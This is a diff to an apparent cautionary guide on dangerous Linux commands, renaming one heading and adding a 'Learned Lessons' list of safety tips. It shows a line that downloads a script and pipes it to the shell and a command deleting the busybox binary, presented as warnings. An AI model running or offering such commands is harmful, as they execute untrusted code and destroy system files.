@@ -47,7 +47,7 @@ Redirecting will write raw bytes on your disk partition. What can never will be?
 This command will move all your personal data in the Linux equivalent of a Black Hole.
 
 
-## Downloads and Runs a Script
+## stranger danger
 
 `wget http://example.com/something -O – | sh –`
 
@@ -55,6 +55,12 @@ This command will move all your personal data in the Linux equivalent of a Black
 ## You will be no more busy
 
 `rm -f /usr/sbin/busybox`
+
+## Learned Lessons
+* excute a command with root privileges only if it is strictly necessary
+* beware from rm -r commands
+* never handle partions handles (such as /dev/sda1)
+* never execute untrusted content
 
 
 ## References
